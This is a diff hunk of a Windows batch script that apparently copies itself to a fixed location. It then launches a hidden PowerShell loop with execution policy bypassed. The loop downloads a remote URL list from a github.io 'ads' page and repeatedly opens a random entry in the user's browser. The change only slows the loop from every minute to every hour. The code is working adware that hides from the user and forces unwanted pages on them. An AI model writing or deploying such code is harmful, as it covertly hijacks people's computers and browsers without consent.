@@ -25,5 +25,5 @@ if /i not "%~f0"=="%BAT_DESTINO%" (
     exit /b
 )
 
-powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while ($true) { try { $r = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing -TimeoutSec 15; $u = ($r.Content -split \"`r?`n\") | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($u.Count -gt 0) { $target = Get-Random -InputObject $u; $encoded = [uri]::EscapeDataString($target); Start-Process -FilePath \"https://browsergx.github.io/ads/go.html?url=$encoded\" } } catch {}; Start-Sleep -Seconds 60 } }"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while ($true) { try { $r = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing -TimeoutSec 15; $u = ($r.Content -split \"`r?`n\") | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($u.Count -gt 0) { $target = Get-Random -InputObject $u; $encoded = [uri]::EscapeDataString($target); Start-Process -FilePath \"https://browsergx.github.io/ads/go.html?url=$encoded\" } } catch {}; Start-Sleep -Seconds 3600 } }"
 exit /b
